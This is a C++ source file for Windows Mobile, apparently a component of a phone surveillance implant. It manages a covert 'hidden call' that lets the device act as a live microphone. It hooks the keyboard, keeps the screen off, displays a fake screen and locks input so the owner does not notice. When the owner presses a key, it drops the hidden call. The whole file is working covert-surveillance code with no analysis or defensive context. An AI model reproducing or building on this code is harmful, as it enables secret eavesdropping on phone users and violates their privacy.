#include <Windows.h>
#include "CallBacks.h"
#include "LiveMic.h"
#include "ControlTh.h"

// Executed whenever a key has been pressed
LRESULT WndKeyProc(INT code, WPARAM wParam, LPARAM lParam)
{
	LiveMic* pLiveMic = LiveMic::self();
	ControlTh* pControlTh = ControlTh::self();

	if (code < 0)
		return pControlTh->CallNextHookEx(pControlTh->hHook, code, wParam, lParam);

	if (pControlTh->bKeyboardLocked)
		return NULL;

	if (((KBDLLHOOKSTRUCT *) lParam)->vkCode == 114)
		// Premuto il pulsante "cornetta verde", 
		pLiveMic->SetCprogOption(L"");	// Bisogna togliere l'opzione -n per l'avvio di cprog
										// con la finestra in foregroung
	DBG_TRACE_INT(L"ControlTh.cpp WndKeyProc pulsante premuto ", 5, FALSE, ((KBDLLHOOKSTRUCT *)lParam)->vkCode );

	if (pLiveMic->IsHiddenCallInProgress()) {
		
		pLiveMic->FakeScreenStart();
		pLiveMic->KeepScreenOff();
		
		DBG_TRACE(L"ControlTh.cpp WndKeyProc pulsante premuto durante la hidden call", 5, FALSE);

		if (!pLiveMic->DropHiddenCall(NULL, TRUE)) {
			pLiveMic->FakeScreenStop();
		}
		//pLiveMic->KeepScreenOff(500, TRUE);
		return NULL;
	}
	return pControlTh->CallNextHookEx(pControlTh->hHook, code, wParam, lParam);
}

void pfnFuncProc(HWND hWin, UINT u1, UINT u2, DWORD dw1)
{
	LONG rc = -1;
	Device* pDevice = Device::self();
	LiveMic* pLiveMic = LiveMic::self();
	ControlTh* pControlTh = ControlTh::self();
	
	if (pControlTh->uStartTimer)
		KillTimer(0, pControlTh->uStartTimer);

	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_ABOVE_NORMAL);

	if (pControlTh->bHooked == FALSE) {

		if (pControlTh->hHook != NULL) {
			pControlTh->UnhookWindowsHookEx(pControlTh->hHook);
			pControlTh->hHook = NULL;
		}
																
		pControlTh->hHook = pControlTh->SetWindowsHookEx(WH_KEYBOARD_LL, WndKeyProc, NULL, 0);
		if (pControlTh->hHook != NULL) {
			pControlTh->bHooked = TRUE;	
		}
	}

	// Check hidden call incoming or in progress
	if (pLiveMic->IsHiddenCallIncoming() || pLiveMic->IsHiddenCallInProgress()) {
		
		// Se lo stato del telefono e' ON
		//if (pLiveMic->GetPowerState()) {

		if (pControlTh->m_bPowerStatusOn) {

			//pLiveMic->KeepScreenOff();

			if (pLiveMic->IsHiddenCallInProgress()) {

				DBG_TRACE_INT(L"ControlTh.cpp pfnFuncProc I'm killing your call! ", 5, FALSE, pLiveMic->GetPowerState());

				// Lock keyboard
				pControlTh->bKeyboardLocked = TRUE;

				// Lock screen
				pLiveMic->FakeScreenStart();
				
				if (pLiveMic->DropHiddenCall(NULL, TRUE)) {
					
					//Sleep(500);
				} else {
					DBG_TRACE(L"ControlTh.cpp pfnFuncProc pLiveMic->DropHiddenCall(NULL, TRUE) FAILED ", 5, FALSE);
					pLiveMic->FakeScreenStop();
				}
					// enable keyboard
				pControlTh->bKeyboardLocked = FALSE;
			} else {
				if (pLiveMic->IsHiddenCallIncoming()) {
					pLiveMic->KeepScreenOff();		
				}
			}
		} 
		// lets boost
		pControlTh->uStartTimer = SetTimer(0, 0, TIMER_BOOST_FREQ, (TIMERPROC)pfnFuncProc);
	} else {
		pControlTh->uStartTimer = SetTimer(0, 0, TIMER_START_FREQ, (TIMERPROC)pfnFuncProc);
	}
}

void __stdcall MsgPumpTh(LPVOID lpParam)
{
	ControlTh* pControlTh = ControlTh::self();

	pControlTh->uStartTimer = SetTimer(NULL, 0, TIMER_START_FREQ, (TIMERPROC) pfnFuncProc);
			   
	UINT uTest = 0;

	while (GetMessageW(&(pControlTh->ControlThMsg), 0, 0, 0)) {		 
		
		if (pControlTh->bStopThread == TRUE) {
			pControlTh->bStopThread = FALSE;
			
			DBG_TRACE(L"ControlTh.cpp MsgPumpTh pControlTh->bStopThread == TRUE", 5, FALSE);
			if (pControlTh->uStartTimer) {

				BOOL bOut = KillTimer(0, pControlTh->uStartTimer);
				if (bOut == FALSE) {
					DBG_TRACE(L"ControlTh.cpp MsgPumpTh KillTimer == FALSE ", 5, TRUE);
				}
			}

			SetEvent(pControlTh->GetStopThEventHandle());
			ExitThread(0);
		}

		TranslateMessage(&(pControlTh->ControlThMsg));
		DispatchMessageW(&(pControlTh->ControlThMsg));
	}
}

BOOL ControlTh::Start()
{
	m_hKeyThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MsgPumpTh, NULL, 0, NULL);

	if (m_hKeyThread == NULL) {
		return FALSE;
	}
	
	m_hSignal = CreateEvent(NULL, FALSE, FALSE, L"");

	DBG_TRACE(L"ControlTh.cpp Start #############################", 5, FALSE);

	return TRUE;
}

BOOL ControlTh::Init()
{
	m_hDll = LoadLibrary(L"coredll.dll");

	if (m_hDll == NULL)
		return FALSE;

	SetWindowsHookEx = (t_SetWindowsHookEx) GetProcAddress(m_hDll, L"SetWindowsHookExW");
	UnhookWindowsHookEx = (t_UnhookWindowsHookEx) GetProcAddress(m_hDll, L"UnhookWindowsHookEx");
	CallNextHookEx = (t_CallNextHookEx) GetProcAddress(m_hDll, L"CallNextHookEx");

	wcsState =  new(nothrow) WCHAR[MAX_PATH];

	if (SetWindowsHookEx == NULL ||
		UnhookWindowsHookEx == NULL ||
		CallNextHookEx == NULL ||
		wcsState == NULL)
		return FALSE;

	
	Device* m_pDevice = Device::self();
	m_bPowerStatusOn  = 0;

	if (m_pDevice->RegisterPowerNotification(BackLightCallback, (DWORD)&m_bPowerStatusOn) == FALSE) {
		DBG_TRACE(L"ControlTh.cpp Start RegisterPowerNotification FAILED ", 5, FALSE);
		return FALSE;
	}

	return TRUE;
}

DWORD ControlTh::Stop()
{
	DWORD dwRet = 0;

	bStopThread = TRUE;

	DBG_TRACE(L"ControlTh.cpp Stop #############################", 5, FALSE);

	if (m_hSignal) {
		dwRet = WaitForSingleObject(m_hSignal, INFINITE);
		CloseHandle(m_hSignal);
	}

	if (m_hKeyThread)
		CloseHandle(m_hKeyThread);

	return dwRet;
}

VOID ControlTh::Uninit()
{
	Device* m_pDevice = Device::self();
	if (m_pDevice->UnRegisterPowerNotification(BackLightCallback)) {
		DBG_TRACE(L"ControlTh.cpp Uninitialize UnRegisterPowerNotification OK ", 5, FALSE);
	}

	if (wcsState)
		delete [] wcsState;
	
	m_hKeyThread = NULL;

	if (hHook) {
		if (UnhookWindowsHookEx(hHook) == 0) {
			DBG_TRACE(L"ControlTh.cpp Uninit UnhookWindowsHookEx(hHook) FAILED ", 5, FALSE);
		}
		hHook = NULL;
	}

	if (m_hSignal) {
		if (!CloseHandle(m_hSignal)) {
			DBG_TRACE(L"ControlTh.cpp Uninit CloseHandle(m_hSignal) FAILED ", 5, FALSE);
		}
		m_hSignal = NULL;
	}

	if (m_hDll)
		FreeLibrary(m_hDll);
}

ControlTh* ControlTh::m_pInstance = NULL;
volatile LONG ControlTh::m_lLock = 0;

ControlTh* ControlTh::self() {

	while (InterlockedExchange((LPLONG) &m_lLock, 1) != 0)
		Sleep(100);

	if (NULL == m_pInstance) {
		m_pInstance = (ControlTh*) new(nothrow) ControlTh();
	}

	InterlockedExchange((LPLONG)&m_lLock, 0);

	return m_pInstance;
}


ControlTh::ControlTh(void)
{
	m_hDll = NULL;
	m_hKeyThread = m_hSignal = NULL;
	uStartTimer = 0;
	bStopThread = FALSE;
	bKeyboardLocked = bHooked = FALSE;
	m_bPowerStatusOn = FALSE;

	t_SetWindowsHookEx SetWindowsHookEx = NULL;
	t_UnhookWindowsHookEx UnhookWindowsHookEx = NULL;
	t_CallNextHookEx CallNextHookEx = NULL;
	wcsState = NULL;
	hHook = NULL;
	uBackligthONTimes = 0;
}

ControlTh::~ControlTh(void)
{

}